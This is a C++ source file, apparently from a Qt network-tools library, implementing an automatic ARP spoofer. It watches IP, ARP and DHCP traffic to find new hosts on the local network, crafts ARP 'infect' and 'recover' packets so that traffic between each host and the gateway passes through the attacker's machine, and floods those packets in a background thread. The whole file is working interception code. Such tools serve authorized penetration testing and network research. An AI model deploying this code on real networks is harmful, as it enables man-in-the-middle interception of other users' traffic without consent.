#include "gautoarpspoof.h"
#include "net/pdu/gdhcphdr.h"

// ----------------------------------------------------------------------------
// GAutoArpSpoof
// ----------------------------------------------------------------------------
bool GAutoArpSpoof::doOpen() {
	if (!enabled_) return true;

	if (checkIp_ == false && checkArp_ == false && checkDhcp_ == false) {
		SET_ERR(GErr::FAIL, "all checking ip, arp, dhcp are false");
		return false;
	}

	if (!GArpSpoof::doOpen()) return false;

	Q_ASSERT(intf_ != nullptr);
	myMac_ = intf_->mac();
	myIp_ = intf_->ip();
	gwIp_ = intf_->gateway();

	GAtm::iterator it = atm_.find(gwIp_);
	if (it == atm_.end()) {
		atm_.insert(gwIp_, GMac::nullMac());
		if (!atm_.open()) {
			err = atm_.err;
			atm_.close();
			return false;
		}
		bool res = atm_.wait();
		atm_.close();
		if (!res) {
			SET_ERR(GErr::FAIL, QString("can not find mac for %1").arg(QString(gwIp_)));
			return false;
		}
		it = atm_.find(gwIp_);
		Q_ASSERT(it != atm_.end());
	}
	gwMac_ = it.value();

	return true;
}

bool GAutoArpSpoof::doClose() {
	if (!enabled_) return true;

	return GArpSpoof::doClose();
}

void GAutoArpSpoof::processPacket(GPacket* packet) {
	GMac mac;
	GIp ip;

	bool attack = false;
	if (checkIp_ && processIp(packet, &mac, &ip))
		attack = true;
	if (checkArp_ && processArp(packet, &mac, &ip))
		attack = true;
	if (checkDhcp_ && processDhcp(packet, &mac, &ip))
		attack = true;
	if (!attack) return;

	if (ip == myIp_ || ip == gwIp_) return;
	if (mac == myMac_ || mac == gwMac_) return;

	GFlow::IpFlowKey ipFlowKey(ip, gwIp_);
	if (flowMap_.find(ipFlowKey) != flowMap_.end()) return;

	Flow flow(ip, mac, gwIp_, gwMac_);
	flow.makePacket(&flow.infectPacket_, myMac_, true);
	flow.makePacket(&flow.recoverPacket_, myMac_, false);

	qDebug() << QString("new host(%1 %2) detected").arg(QString(mac), QString(ip));

	flowMap_.insert(ipFlowKey, flow);
	flowList_.push_back(flow);
	sendArpInfect(&flow);

	GFlow::IpFlowKey revIpFlowKey(gwIp_, ip);
	Flow revFlow(gwIp_, gwMac_, ip, mac);
	revFlow.makePacket(&revFlow.infectPacket_, myMac_, true);
	revFlow.makePacket(&revFlow.recoverPacket_, myMac_, false);

	flowMap_.insert(revIpFlowKey, revFlow);
	{
		QMutexLocker(&flowList_.m_);
		flowList_.push_back(revFlow);
	}
	sendArpInfect(&revFlow);
	if (floodingInterval_ != 0) {
		FloodingThread* thread = new FloodingThread(this, &flow.infectPacket_, &revFlow.infectPacket_);
		QObject::connect(thread, &QThread::finished, thread, &QObject::deleteLater);
		this->moveToThread(thread);
		thread->start();
	}
}

bool GAutoArpSpoof::processIp(GPacket* packet, GMac* mac, GIp* ip) {
	GEthHdr* ethHdr = packet->ethHdr_;
	if (ethHdr == nullptr) return false;

	GIpHdr* ipHdr = packet->ipHdr_;
	if (ipHdr == nullptr) return false;

	*mac = ethHdr->smac();
	*ip = ipHdr->sip();
	return true;
}

bool GAutoArpSpoof::processArp(GPacket* packet, GMac* mac, GIp* ip) {
	GArpHdr* arpHdr = packet->arpHdr_;
	if (arpHdr == nullptr) return false;

	*mac = arpHdr->smac();
	*ip = arpHdr->sip();
	return true;
}

bool GAutoArpSpoof::processDhcp(GPacket* packet, GMac* mac, GIp* ip) {
	GUdpHdr* udpHdr = packet->udpHdr_;
	if (udpHdr == nullptr) return false;

	if (!(udpHdr->sport() == 67 || udpHdr->dport() == 67)) return false;

	GBuf dhcp = packet->udpData_;
	if (dhcp.data_ == nullptr) return false;
	if (dhcp.size_ < sizeof(GDhcpHdr)) return false;
	GDhcpHdr* dhcpHdr = PDhcpHdr(dhcp.data_);

	if (dhcpHdr->yourIp() != 0) { // DHCP Offer of DHCP ACK sent from server
		*mac = dhcpHdr->clientMac();
		*ip = dhcpHdr->yourIp();
		return true;
	}

	GEthHdr* ethHdr = packet->ethHdr_;
	if (ethHdr == nullptr) return false;
	gbyte* end = packet->buf_.data_ + packet->buf_.size_;
	GDhcpHdr::Option* option = dhcpHdr->first();
	while (true) {
		if (option->type_ == GDhcpHdr::RequestedIpAddress) {
			GDhcpHdr::POptionRequestIpAddress ipAddress = GDhcpHdr::POptionRequestIpAddress(option);
			*mac = ethHdr->smac();
			*ip = ntohl(ipAddress->ip_);
			return true;
		}
		option = option->next();
		if (option == nullptr) break;
		if (pbyte(option) >= end) break;
	}
	return false;
}

GAutoArpSpoof::FloodingThread::FloodingThread(GAutoArpSpoof* parent, GEthArpHdr* infectPacket1, GEthArpHdr* infectPacket2) : QThread(parent) {
	GDEBUG_CTOR
	parent_ = parent;
	infectPacket_[0] = * infectPacket1;
	infectPacket_[1] = * infectPacket2;
}

GAutoArpSpoof::FloodingThread::~FloodingThread() {
	GDEBUG_DTOR
}

void GAutoArpSpoof::FloodingThread::run() {
	qDebug() << "beg";
	QElapsedTimer timer;
	timer.start();
	while (true) {
		qint64 elapsed = timer.elapsed();
		if (elapsed > qint64(parent_->floodingInterval_)) break;
		for (int i = 0; i < 2; i++) {
			GBuf buf(pbyte(&infectPacket_[i]), sizeof(GEthArpHdr));
			parent_->write(buf);
			QThread::msleep(parent_->sendInterval_);
		}
		QThread::msleep(parent_->floodingSendInterval_);
	}
	qDebug() << "end";
}

void GAutoArpSpoof::myDeleteLater() {
	qDebug() << "myDeleteLater()";
}
